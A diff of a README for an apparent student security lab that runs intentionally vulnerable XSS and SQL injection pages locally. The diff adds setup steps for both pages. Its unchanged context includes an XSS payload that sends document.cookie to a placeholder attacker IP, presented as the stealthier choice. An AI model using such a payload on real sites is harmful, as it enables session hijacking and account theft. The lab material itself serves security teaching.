@@ -7,7 +7,13 @@ This repository collects tools and methodologies used in the context of system s
 - Open a command prompt inside the project root directory and execute the following command:
 
   		docker compose up --build
-- Visit the vulnerable app at: http://localhost:9000/xss.php
+		
+### For XSS vulnerability
+- Visit the vulnerable page at: http://localhost:9000/xss.php
+
+### SQLi vulnerability
+- Initialize the SQLite db at: http://localhost:9000/initDB.php. You should get a response with "Done"
+- Visit the vulnerable page at: http://localhost:9000/sqlI.php 
 
 ## Students
 1. Dario Collini
@@ -26,6 +32,9 @@ Not the best approach, generates a bunch of requests, very loud
 More stealth, use this one
 
     <script>i=document.createElement('img');i.src='http://<attacker IP>:8000/'+document.cookie;document.body.appendChild(img)</script>
+	
+
+## TODO: write some SQLi payloads used in the lab
 
 
 ## Vulnerabilities Scenario and actions
